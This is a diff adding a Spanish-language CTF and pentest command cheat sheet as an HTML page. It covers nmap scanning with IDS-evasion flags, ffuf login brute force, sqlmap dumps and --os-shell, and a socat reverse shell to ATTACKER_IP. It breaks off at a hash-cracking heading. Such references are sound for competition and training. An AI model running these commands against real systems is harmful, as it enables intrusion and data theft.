@@ -1,0 +1,955 @@
+<title>CTF Toolkit</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600&display=swap');
+
+  :root{
+    --bg:#f6f1e4;
+    --bg-elevated:#efe8d6;
+    --surface:#fffdf7;
+    --border:#ddd3ba;
+    --text:#241f16;
+    --text-dim:#6b6250;
+    --accent:#a8631f;
+    --accent-soft:#f0dcb8;
+    --accent-2:#3f7a70;
+    --danger:#a1453a;
+    --danger-soft:#f3ddd8;
+    --code-bg:#241f16;
+    --code-text:#f1e9d8;
+    --code-border:#3a3325;
+    --shadow: 0 1px 2px rgba(36,31,22,0.06), 0 4px 16px rgba(36,31,22,0.05);
+  }
+  @media (prefers-color-scheme: dark){
+    :root:not([data-theme="light"]){
+      --bg:#15130f;
+      --bg-elevated:#1d1a15;
+      --surface:#201c16;
+      --border:#3a352b;
+      --text:#eee6d6;
+      --text-dim:#a79c86;
+      --accent:#d99a3e;
+      --accent-soft:#3a2c17;
+      --accent-2:#6fa89c;
+      --danger:#c1665a;
+      --danger-soft:#3a2420;
+      --code-bg:#0f0d0a;
+      --code-text:#ecdfc5;
+      --code-border:#332d21;
+      --shadow: 0 1px 2px rgba(0,0,0,0.3), 0 8px 24px rgba(0,0,0,0.35);
+    }
+  }
+  :root[data-theme="dark"]{
+    --bg:#15130f;
+    --bg-elevated:#1d1a15;
+    --surface:#201c16;
+    --border:#3a352b;
+    --text:#eee6d6;
+    --text-dim:#a79c86;
+    --accent:#d99a3e;
+    --accent-soft:#3a2c17;
+    --accent-2:#6fa89c;
+    --danger:#c1665a;
+    --danger-soft:#3a2420;
+    --code-bg:#0f0d0a;
+    --code-text:#ecdfc5;
+    --code-border:#332d21;
+    --shadow: 0 1px 2px rgba(0,0,0,0.3), 0 8px 24px rgba(0,0,0,0.35);
+  }
+
+  *{box-sizing:border-box;}
+  body{
+    margin:0;
+    background:var(--bg);
+    color:var(--text);
+    font-family:"IBM Plex Sans", ui-sans-serif, system-ui, sans-serif;
+    line-height:1.55;
+    -webkit-font-smoothing:antialiased;
+  }
+  h1,h2,h3,.mono{
+    font-family:"IBM Plex Mono", ui-monospace, "SF Mono", Menlo, monospace;
+  }
+  h1,h2,h3{ text-wrap:balance; margin:0; }
+
+  a{ color:var(--accent-2); }
+
+  .layout{
+    display:grid;
+    grid-template-columns: 240px minmax(0,1fr);
+    max-width:1180px;
+    margin:0 auto;
+    gap:0;
+    min-height:100vh;
+  }
+
+  /* ---- Sidebar ---- */
+  nav.toc{
+    position:sticky;
+    top:0;
+    align-self:start;
+    height:100vh;
+    overflow-y:auto;
+    padding:28px 18px 28px 24px;
+    border-right:1px solid var(--border);
+  }
+  .brand{
+    font-size:0.95rem;
+    font-weight:700;
+    letter-spacing:0.02em;
+    display:flex;
+    align-items:center;
+    gap:8px;
+    margin-bottom:4px;
+  }
+  .brand .dot{ color:var(--accent); }
+  .brand-sub{
+    font-size:0.72rem;
+    color:var(--text-dim);
+    margin-bottom:22px;
+    font-family:"IBM Plex Sans", sans-serif;
+  }
+  .toc-group{ margin-bottom:2px; }
+  .toc-link{
+    display:flex;
+    align-items:baseline;
+    gap:8px;
+    padding:6px 8px;
+    border-radius:6px;
+    font-size:0.84rem;
+    color:var(--text-dim);
+    text-decoration:none;
+    font-family:"IBM Plex Mono", monospace;
+  }
+  .toc-link:hover{ background:var(--bg-elevated); color:var(--text); }
+  .toc-link .idx{ color:var(--accent); font-size:0.72rem; width:1.4em; flex:none; }
+
+  /* ---- Main ---- */
+  main{ padding:36px 40px 100px; min-width:0; }
+
+  header.masthead{
+    margin-bottom:38px;
+    padding-bottom:26px;
+    border-bottom:1px solid var(--border);
+  }
+  .eyebrow{
+    font-family:"IBM Plex Mono", monospace;
+    font-size:0.72rem;
+    letter-spacing:0.12em;
+    text-transform:uppercase;
+    color:var(--accent);
+    margin-bottom:10px;
+  }
+  header.masthead h1{
+    font-size:2.1rem;
+    font-weight:700;
+    margin-bottom:12px;
+  }
+  header.masthead p{
+    color:var(--text-dim);
+    max-width:62ch;
+    font-size:0.98rem;
+  }
+
+  section.tool{
+    padding:34px 0;
+    border-bottom:1px solid var(--border);
+    scroll-margin-top:20px;
+  }
+  section.tool:last-of-type{ border-bottom:none; }
+
+  .tool-head{
+    display:flex;
+    align-items:baseline;
+    gap:14px;
+    flex-wrap:wrap;
+    margin-bottom:6px;
+  }
+  .tool-head h2{ font-size:1.4rem; }
+  .tool-tag{
+    font-family:"IBM Plex Mono", monospace;
+    font-size:0.68rem;
+    letter-spacing:0.06em;
+    text-transform:uppercase;
+    color:var(--accent-2);
+    border:1px solid var(--border);
+    background:var(--bg-elevated);
+    padding:2px 8px;
+    border-radius:20px;
+  }
+  .tool-desc{
+    color:var(--text-dim);
+    max-width:70ch;
+    margin:6px 0 20px;
+    font-size:0.93rem;
+  }
+
+  h3.subhead{
+    font-size:0.78rem;
+    text-transform:uppercase;
+    letter-spacing:0.08em;
+    color:var(--text-dim);
+    margin:22px 0 10px;
+  }
+  h3.subhead:first-of-type{ margin-top:4px; }
+
+  .cmd{
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:10px;
+    padding:14px 16px;
+    margin-bottom:10px;
+    box-shadow:var(--shadow);
+  }
+  .cmd-label{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    gap:10px;
+    margin-bottom:8px;
+  }
+  .cmd-label span{
+    font-size:0.85rem;
+    color:var(--text);
+    font-weight:500;
+  }
+  .copy-btn{
+    font-family:"IBM Plex Mono", monospace;
+    font-size:0.68rem;
+    letter-spacing:0.04em;
+    text-transform:uppercase;
+    background:transparent;
+    color:var(--text-dim);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:3px 9px;
+    cursor:pointer;
+    flex:none;
+  }
+  .copy-btn:hover{ color:var(--accent); border-color:var(--accent); }
+  .copy-btn:focus-visible, .toc-link:focus-visible{
+    outline:2px solid var(--accent);
+    outline-offset:2px;
+  }
+  .copy-btn.copied{ color:var(--accent-2); border-color:var(--accent-2); }
+
+  pre{
+    margin:0;
+    background:var(--code-bg);
+    border:1px solid var(--code-border);
+    border-radius:8px;
+    padding:12px 14px;
+    overflow-x:auto;
+  }
+  code{
+    font-family:"IBM Plex Mono", monospace;
+    font-size:0.83rem;
+    color:var(--code-text);
+    white-space:pre;
+  }
+  .flags{
+    margin-top:10px;
+    display:grid;
+    grid-template-columns: max-content 1fr;
+    gap:4px 14px;
+    font-size:0.82rem;
+  }
+  .flags .f{
+    font-family:"IBM Plex Mono", monospace;
+    color:var(--accent);
+    white-space:nowrap;
+  }
+  .flags .d{ color:var(--text-dim); }
+
+  .pill{
+    font-family:"IBM Plex Mono", monospace;
+    font-size:0.66rem;
+    text-transform:uppercase;
+    letter-spacing:0.04em;
+    padding:2px 8px;
+    border-radius:20px;
+    flex:none;
+    line-height:1.6;
+  }
+  .pill-primary{ background:var(--accent); color:var(--bg); border:1px solid var(--accent); }
+  .pill-alt{ background:transparent; color:var(--accent-2); border:1px solid var(--accent-2); }
+  .pill-neutral{ background:var(--bg-elevated); color:var(--text-dim); border:1px solid var(--border); }
+  .cmd-title{ display:flex; align-items:center; gap:8px; flex-wrap:wrap; }
+
+  .equiv{
+    display:grid;
+    grid-template-columns: 1.3fr 1fr 1fr;
+    gap:0 14px;
+    font-size:0.82rem;
+    margin:14px 0 26px;
+    overflow-x:auto;
+  }
+  .equiv-row{ display:contents; }
+  .equiv-row > span{
+    padding:6px 0;
+    border-bottom:1px solid var(--border);
+  }
+  .equiv-row.equiv-head > span{
+    color:var(--text-dim);
+    text-transform:uppercase;
+    font-size:0.66rem;
+    letter-spacing:0.06em;
+    font-family:"IBM Plex Mono", monospace;
+    border-bottom:1px solid var(--border);
+  }
+  .equiv-row span.mono{
+    font-family:"IBM Plex Mono", monospace;
+    color:var(--accent);
+  }
+  @media (max-width:600px){
+    .equiv{ grid-template-columns: 1fr; }
+    .equiv-row{ display:block; padding:8px 0; border-bottom:1px solid var(--border); }
+    .equiv-row > span{ display:block; border-bottom:none; padding:1px 0; }
+    .equiv-row.equiv-head{ display:none; }
+    .equiv-row > span:first-child{ color:var(--text-dim); font-size:0.72rem; text-transform:uppercase; letter-spacing:0.05em; font-family:"IBM Plex Mono",monospace; }
+  }
+
+  .note{
+    display:flex;
+    gap:10px;
+    background:var(--accent-soft);
+    border:1px solid var(--border);
+    border-radius:8px;
+    padding:10px 14px;
+    font-size:0.85rem;
+    margin:14px 0;
+    color:var(--text);
+  }
+  .note.warn{ background:var(--danger-soft); }
+  .note b{ color:var(--danger); font-family:"IBM Plex Mono",monospace; font-size:0.72rem; text-transform:uppercase; letter-spacing:0.06em; flex:none; }
+
+  ol.steps{ margin:0 0 16px; padding-left:1.3em; font-size:0.93rem; }
+  ol.steps li{ margin-bottom:8px; }
+
+  .extras-grid{
+    display:grid;
+    grid-template-columns: repeat(auto-fill, minmax(230px,1fr));
+    gap:14px;
+  }
+  .extra-card{
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:10px;
+    padding:14px 16px;
+  }
+  .extra-card h4{
+    font-family:"IBM Plex Mono",monospace;
+    font-size:0.88rem;
+    margin:0 0 6px;
+    color:var(--accent);
+  }
+  .extra-card p{
+    margin:0;
+    font-size:0.82rem;
+    color:var(--text-dim);
+  }
+
+  footer{
+    color:var(--text-dim);
+    font-size:0.78rem;
+    padding-top:20px;
+    font-family:"IBM Plex Mono",monospace;
+  }
+
+  @media (max-width:860px){
+    .layout{ grid-template-columns:1fr; }
+    nav.toc{
+      position:static;
+      height:auto;
+      border-right:none;
+      border-bottom:1px solid var(--border);
+      display:flex;
+      flex-wrap:wrap;
+      gap:4px 10px;
+      padding:16px 20px;
+    }
+    .brand, .brand-sub{ width:100%; }
+    main{ padding:28px 20px 80px; }
+  }
+  @media (prefers-reduced-motion:no-preference){
+    .copy-btn{ transition:color .15s, border-color .15s; }
+  }
+</style>
+
+<div class="layout">
+  <nav class="toc" aria-label="Índice de herramientas">
+    <div class="brand"><span class="dot">&gt;</span> CTF Toolkit</div>
+    <div class="brand-sub">referencia rápida de comandos</div>
+    <div class="toc-group">
+      <a class="toc-link" href="#recon"><span class="idx">01</span>recon &amp; puertos</a>
+      <a class="toc-link" href="#fuzzing"><span class="idx">02</span>fuzzing web</a>
+      <a class="toc-link" href="#sqlmap"><span class="idx">03</span>sqlmap</a>
+      <a class="toc-link" href="#shell"><span class="idx">04</span>upgrade shell</a>
+      <a class="toc-link" href="#cracking"><span class="idx">05</span>cracking de hashes</a>
+      <a class="toc-link" href="#wordlists"><span class="idx">06</span>wordlists</a>
+      <a class="toc-link" href="#refs"><span class="idx">07</span>referencias online</a>
+      <a class="toc-link" href="#extras"><span class="idx">08</span>otras herramientas</a>
+    </div>
+  </nav>
+
+  <main>
+    <header class="masthead">
+      <div class="eyebrow">Pentest / CTF Reference</div>
+      <h1>Comandos para la competencia</h1>
+      <p>Recon, fuzzing, explotación y cracking en un solo lugar. Cada bloque de código tiene un botón para copiar. Ajustá IP, wordlists y puertos según el objetivo.</p>
+    </header>
+
+    <!-- RECON -->
+    <section class="tool" id="recon">
+      <div class="tool-head"><h2>Recon &amp; escaneo de puertos</h2><span class="tool-tag">nmap / rustscan</span></div>
+      <p class="tool-desc">Encontrar hosts vivos, puertos abiertos y qué corre en cada uno. Regla general: <b style="color:var(--text)">rustscan</b> para barrer rápido, <b style="color:var(--text)">nmap</b> para profundizar — no compiten, se complementan.</p>
+
+      <h3 class="subhead">Descubrimiento de hosts</h3>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-neutral">nmap</span><span>Ping sweep en una red</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>nmap -sn 10.10.10.0/24</code></pre>
+      </div>
+
+      <div class="note"><b>Flujo</b><span>El clásico de 3 pasos: (1) barrer <em>todos</em> los puertos rápido, (2) <span class="mono" style="color:var(--accent)">-sC -sV</span> solo sobre esos puertos, (3) scripts de vulnerabilidades sobre esos puertos. rustscan reemplaza el paso 1 y puede encadenar los otros dos pasándole flags de nmap después de <span class="mono" style="color:var(--accent-2)">--</span>.</span></div>
+
+      <h3 class="subhead">Paso 1 — todos los puertos</h3>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-alt">nmap</span><span>SYN scan completo, greppable</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>nmap -p- -sS --min-rate 5000 -vvv -n <IP> -oG allPorts</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-primary">rustscan</span><span>Mismo resultado, mucho más rápido (rustscan descubre, nmap verifica y formatea)</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>rustscan -a <IP> --ulimit 5000 -- -sS -vvv -n -oG allPorts</code></pre>
+      </div>
+
+      <h3 class="subhead">Paso 2 — servicios y versión sobre esos puertos</h3>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-alt">nmap</span><span>Scripts default + detección de versión</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>nmap -sC -sV -p<PUERTOS> <IP> -oN targeted</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-primary">rustscan</span><span>Descubre puertos y corre -sC -sV en un solo comando</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>rustscan -a <IP> --ulimit 5000 -- -sC -sV -oN targeted</code></pre>
+      </div>
+
+      <h3 class="subhead">Paso 3 — scripts de vulnerabilidades</h3>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-alt">nmap</span><span>Vuln scripts filtrados por los que son seguros</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>nmap -p<PUERTOS> --script="vuln and safe" <IP> -oN vulnSafeScan</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-primary">rustscan</span><span>Mismo scan, encadenado desde el descubrimiento</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>rustscan -a <IP> --ulimit 5000 -- --script="vuln and safe" -oN vulnSafeScan</code></pre>
+      </div>
+
+      <h3 class="subhead">Otras combinaciones de scripts NSE</h3>
+      <p class="tool-desc" style="margin-bottom:12px">Las categorías se pueden combinar con <span class="mono" style="color:var(--accent)">and</span> / <span class="mono" style="color:var(--accent)">or</span> / <span class="mono" style="color:var(--accent)">not</span>. Cuanto más agresivo el scan, más ruido y más chance de romper algo — en CTF normalmente está bien, en un pentest real hay que ir con cuidado.</p>
+      <div class="flags">
+        <div class="f">vuln</div><div class="d">todos los scripts de detección de vulns (más lento y ruidoso que "vuln and safe")</div>
+        <div class="f">vuln and safe</div><div class="d">solo los de vuln que no deberían romper nada — el que ya usás</div>
+        <div class="f">default or vuln</div><div class="d">corre los scripts default (-sC) y los de vuln juntos, en una sola pasada</div>
+        <div class="f">auth</div><div class="d">prueba credenciales default y bypass de autenticación</div>
+        <div class="f">discovery</div><div class="d">enumera de más: shares, usuarios, bases de datos, configuración</div>
+        <div class="f">exploit</div><div class="d">intenta explotar activamente lo que encuentra — agresivo, puede tumbar el servicio</div>
+        <div class="f">brute</div><div class="d">fuerza bruta de credenciales vía NSE — lento y ruidoso</div>
+        <div class="f">intrusive</div><div class="d">scripts que pueden afectar estabilidad/performance del target</div>
+        <div class="f">malware</div><div class="d">busca backdoors o malware instalado en el servicio</div>
+      </div>
+      <div class="cmd" style="margin-top:14px">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-neutral">nmap</span><span>Ejemplo: default + vuln combinados</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>nmap -p<PUERTOS> --script="default or vuln" <IP> -oN defaultVuln</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-neutral">nmap</span><span>Ejemplo: vuln evitando los más invasivos</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>nmap -p<PUERTOS> --script="vuln and not intrusive" <IP> -oN vulnCareful</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-neutral">nmap</span><span>Familia de scripts puntual por wildcard (ej: http)</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>nmap -p80,443 --script="http-vuln*" <IP> -oN httpVuln</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-neutral">nmap</span><span>Script puntual (ej: shares SMB)</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>nmap --script smb-enum-shares,smb-enum-users -p445 <IP></code></pre>
+      </div>
+
+      <h3 class="subhead">UDP</h3>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-neutral">nmap</span><span>Top puertos UDP</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>nmap -sU --top-ports 100 -T4 <IP></code></pre>
+      </div>
+
+      <div class="flags">
+        <div class="f">-vvv</div><div class="d">verbosidad máxima — vas viendo puertos abiertos en tiempo real</div>
+        <div class="f">-n</div><div class="d">no resuelve DNS, arranca más rápido</div>
+        <div class="f">-Pn</div><div class="d">no hacer ping antes (asume host up) — útil si bloquean ICMP</div>
+        <div class="f">-oG / -oN / -oA</div><div class="d">greppable / normal / los 3 formatos (.nmap .gnmap .xml)</div>
+        <div class="f">-A</div><div class="d">OS detection + versiones + scripts + traceroute, todo junto (más lento y ruidoso)</div>
+        <div class="f">-f / --mtu</div><div class="d">fragmenta paquetes para evadir IDS/firewalls básicos</div>
+        <div class="f">-D RND:10</div><div class="d">decoy scan, oculta tu IP entre 10 IPs señuelo</div>
+        <div class="f">--source-port 53</div><div class="d">fuerza puerto de origen (bypass de reglas de firewall laxas)</div>
+        <div class="f">rustscan -b</div><div class="d">tamaño de batch de sockets (default 4500, bajalo si se cuelga)</div>
+        <div class="f">rustscan --</div><div class="d">todo lo que va después se pasa tal cual a nmap</div>
+      </div>
+    </section>
+
+    <!-- FUZZING WEB -->
+    <section class="tool" id="fuzzing">
+      <div class="tool-head"><h2>Fuzzing web</h2><span class="tool-tag">gobuster / ffuf</span></div>
+      <p class="tool-desc">Directorios, vhosts, subdominios y parámetros — organizado por lo que querés lograr, no por herramienta.</p>
+
+      <div class="note"><b>Default</b><span>Usá <span class="mono" style="color:var(--accent)">ffuf</span> — es más rápido y cubre todos los casos de abajo. <span class="mono" style="color:var(--accent-2)">gobuster</span> queda como plan B simple si ffuf no está instalado.</span></div>
+
+      <h3 class="subhead">Equivalencias de flags</h3>
+      <div class="equiv">
+        <div class="equiv-row equiv-head"><span>Acción</span><span>gobuster</span><span>ffuf</span></div>
+        <div class="equiv-row"><span>Whitelist de status codes</span><span class="mono">-s 200,301</span><span class="mono">-mc 200,301</span></div>
+        <div class="equiv-row"><span>Blacklist de status codes</span><span class="mono">-b 404,403</span><span class="mono">-fc 404,403</span></div>
+        <div class="equiv-row"><span>Filtrar por tamaño de respuesta</span><span class="mono">--exclude-length N</span><span class="mono">-fs N</span></div>
+        <div class="equiv-row"><span>Extensiones</span><span class="mono">-x php,txt</span><span class="mono">-e .php,.txt</span></div>
+        <div class="equiv-row"><span>Threads</span><span class="mono">-t 50</span><span class="mono">-t 50</span></div>
+        <div class="equiv-row"><span>Header / cookie</span><span class="mono">-H "K: V"</span><span class="mono">-H "K: V"</span></div>
+        <div class="equiv-row"><span>Ignorar TLS self-signed</span><span class="mono">-k</span><span class="mono">-k</span></div>
+        <div class="equiv-row"><span>Guardar resultados</span><span class="mono">-o archivo</span><span class="mono">-o archivo -of json</span></div>
+      </div>
+
+      <h3 class="subhead">Directorios y archivos</h3>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-primary">ffuf</span><span>Con extensiones y filtro de tamaño</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>ffuf -u http://target/FUZZ -w wordlist.txt -e .php,.html,.txt -t 50 -mc 200,204,301,302,307,401 -fs 1234</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-primary">ffuf</span><span>Recursivo (baja a subcarpetas encontradas)</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>ffuf -u http://target/FUZZ -w wordlist.txt -recursion -recursion-depth 2 -e .php</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-alt">gobuster</span><span>Equivalente con blacklist de códigos</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>gobuster dir -u http://target -w wordlist.txt -x php,html,txt -t 50 -b 404,403</code></pre>
+      </div>
+
+      <h3 class="subhead">Vhosts</h3>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-primary">ffuf</span><span>Fuzzing por header Host</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>ffuf -u http://target -H "Host: FUZZ.target.com" -w subdomains.txt -fs <TAMAÑO_BASE></code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-alt">gobuster</span><span>Modo vhost dedicado, con filtro de falsos positivos</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>gobuster vhost -u http://target.com -w subdomains.txt --append-domain --exclude-length 1234</code></pre>
+      </div>
+
+      <h3 class="subhead">DNS / subdominios</h3>
+      <div class="note"><span>Para esto ffuf no es lo natural (necesitarías resolver DNS por tu cuenta). Usá <span class="mono" style="color:var(--accent-2)">gobuster dns</span>, o herramientas dedicadas como amass/subfinder si están disponibles.</span></div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-alt">gobuster</span><span>Enumeración de subdominios con IPs</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>gobuster dns -d target.com -w subdomains.txt -t 50 -i</code></pre>
+      </div>
+
+      <h3 class="subhead">Parámetros, POST y login bruteforce</h3>
+      <div class="note"><span>gobuster no tiene modo para esto — acá siempre <span class="mono" style="color:var(--accent)">ffuf</span>.</span></div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-primary">ffuf</span><span>Fuerza bruta de login (POST)</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>ffuf -u http://target/login -X POST -d "user=admin&pass=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w passwords.txt -fc 401</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-primary">ffuf</span><span>Dos wordlists en simultáneo (usuario + contraseña)</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>ffuf -u http://target/login -X POST -d "user=FUZZ1&pass=FUZZ2" -w users.txt:FUZZ1 -w passwords.txt:FUZZ2 -fc 401</code></pre>
+      </div>
+
+      <h3 class="subhead">Otros flags útiles</h3>
+      <div class="flags">
+        <div class="f">ffuf -mw / -fw</div><div class="d">match / filter por cantidad de palabras</div>
+        <div class="f">ffuf -ml / -fl</div><div class="d">match / filter por cantidad de líneas</div>
+        <div class="f">ffuf -rate</div><div class="d">límite de requests por segundo</div>
+        <div class="f">ffuf -c</div><div class="d">output coloreado en terminal</div>
+        <div class="f">gobuster -r</div><div class="d">seguir redirects (dir mode)</div>
+        <div class="f">gobuster -a</div><div class="d">User-Agent custom</div>
+        <div class="f">gobuster -i</div><div class="d">(dns) muestra IPs resueltas junto al subdominio</div>
+      </div>
+    </section>
+
+    <!-- SQLMAP -->
+    <section class="tool" id="sqlmap">
+      <div class="tool-head"><h2>sqlmap</h2><span class="tool-tag">explotación / SQLi</span></div>
+      <p class="tool-desc">Detección y explotación automática de SQL injection.</p>
+
+      <div class="cmd">
+        <div class="cmd-label"><span>Test básico sobre un parámetro GET</span><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>sqlmap -u "http://target/page.php?id=1" --batch</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><span>Con cookie de sesión</span><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>sqlmap -u "http://target/page.php?id=1" --cookie="PHPSESSID=abc123" --batch</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><span>Petición POST con datos</span><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>sqlmap -u "http://target/login.php" --data="user=a&pass=b" --batch</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><span>Desde un request capturado en Burp</span><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>sqlmap -r request.txt --batch --level=5 --risk=3</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><span>Enumerar bases de datos → tablas → dump</span><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>sqlmap -u "http://target/page.php?id=1" --dbs
+sqlmap -u "http://target/page.php?id=1" -D nombre_db --tables
+sqlmap -u "http://target/page.php?id=1" -D nombre_db -T usuarios --dump</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><span>Shell del sistema operativo</span><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>sqlmap -u "http://target/page.php?id=1" --os-shell</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><span>Detectar formularios de toda la página</span><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>sqlmap -u "http://target/" --forms --batch</code></pre>
+      </div>
+
+      <div class="flags">
+        <div class="f">--batch</div><div class="d">no pregunta nada, usa defaults (imprescindible para automatizar)</div>
+        <div class="f">--level=1-5</div><div class="d">cuántos puntos de inyección prueba (headers, cookies, etc.)</div>
+        <div class="f">--risk=1-3</div><div class="d">qué tan agresivos son los payloads (3 puede dañar datos)</div>
+        <div class="f">--dbms=mysql</div><div class="d">fuerza el motor de base de datos (evita fingerprinting)</div>
+        <div class="f">--tamper=space2comment</div><div class="d">ofusca el payload para evadir WAF (hay decenas de scripts)</div>
+        <div class="f">--current-user / --current-db</div><div class="d">info rápida sin enumerar todo</div>
+        <div class="f">--dump-all</div><div class="d">dump de todo lo accesible (lento, usar con cuidado)</div>
+      </div>
+    </section>
+
+    <!-- REVERSE SHELL UPGRADE -->
+    <section class="tool" id="shell">
+      <div class="tool-head"><h2>Upgrade de reverse shell</h2><span class="tool-tag">post-explotación</span></div>
+      <p class="tool-desc">Convertir una shell básica (netcat, sin TTY) en una interactiva completa: autocompletado, Ctrl+C que no mata la shell, editores como vim/nano funcionando.</p>
+
+      <h3 class="subhead">Método estándar (Python PTY + stty raw)</h3>
+      <ol class="steps">
+        <li>En la shell que recibiste, spawneá una PTY real:
+          <div class="cmd">
+            <div class="cmd-label"><span>Python3 (o python2 si no hay python3)</span><button class="copy-btn" data-copy>copiar</button></div>
+            <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+          </div>
+        </li>
+        <li>Background la shell con <span class="mono" style="color:var(--accent)">Ctrl+Z</span> (volvés a tu terminal local).</li>
+        <li>En tu terminal (atacante), poné la TTY local en modo raw y volvé al foreground:
+          <div class="cmd">
+            <div class="cmd-label"><span>En tu máquina, antes de "fg"</span><button class="copy-btn" data-copy>copiar</button></div>
+            <pre><code>stty raw -echo; fg</code></pre>
+          </div>
+          Después de esto tenés que apretar Enter una o dos veces.
+        </li>
+        <li>Ya en la shell remota, seteá el entorno:
+          <div class="cmd">
+            <div class="cmd-label"><span>Dentro de la shell remota</span><button class="copy-btn" data-copy>copiar</button></div>
+            <pre><code>export TERM=xterm
+export SHELL=bash</code></pre>
+          </div>
+        </li>
+        <li>Igualá el tamaño de la TTY al de tu terminal real. En otra pestaña local corré <span class="mono" style="color:var(--accent)">stty size</span> (te da "filas columnas") y en la shell remota:
+          <div class="cmd">
+            <div class="cmd-label"><span>Ajustar tamaño (ejemplo: 52 filas, 235 columnas)</span><button class="copy-btn" data-copy>copiar</button></div>
+            <pre><code>stty rows 52 columns 235</code></pre>
+          </div>
+        </li>
+      </ol>
+
+      <h3 class="subhead">Alternativa: socat (TTY completa desde el inicio)</h3>
+      <div class="cmd">
+        <div class="cmd-label"><span>Listener en tu máquina</span><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>socat file:`tty`,raw,echo=0 tcp-listen:4444</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><span>Conexión desde la víctima</span><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444</code></pre>
+      </div>
+
+      <h3 class="subhead">Extras útiles</h3>
+      <div class="cmd">
+        <div class="cmd-label"><span>Listener con rlwrap (historial, flechas, autocompletado local)</span><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>rlwrap nc -lvnp 4444</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><span>Alternativa a python pty si no está disponible</span><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>script -qc /bin/bash /dev/null</code></pre>
+      </div>
+
+      <div class="note"><b>Tip</b><span>Si no hay python en el target, probá <span class="mono">which python python3 perl php ruby lua</span> — casi todos tienen alguna forma de spawnear una pty.</span></div>
+    </section>
+
+    <!-- CRACKING -->
+    <section class="tool" id="cracking">
+      <div class="tool-head"><h2>Cracking de hashes</h2><span class="tool-tag">hashcat / john</span></div>
